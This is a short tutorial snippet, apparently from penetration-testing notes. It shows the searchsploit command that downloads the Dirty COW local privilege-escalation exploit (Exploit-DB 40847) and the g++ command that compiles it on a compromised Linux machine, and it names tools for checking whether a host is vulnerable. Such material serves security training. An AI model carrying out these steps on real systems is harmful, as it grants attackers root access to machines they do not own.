## Exploit-DB (searchsploit)

You can download the .cpp (C++) script with the following command:
```bash
searchsploit -m linux/local/40847.cpp
```

This is to compile within the compromised machine:
```bash
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
```

> This only works if the machine is vulnerable to dirty cow, you can use linpeas or linux exploit suggester to check for it. And also the machine must has the `g++` installed for the exploit compilation.
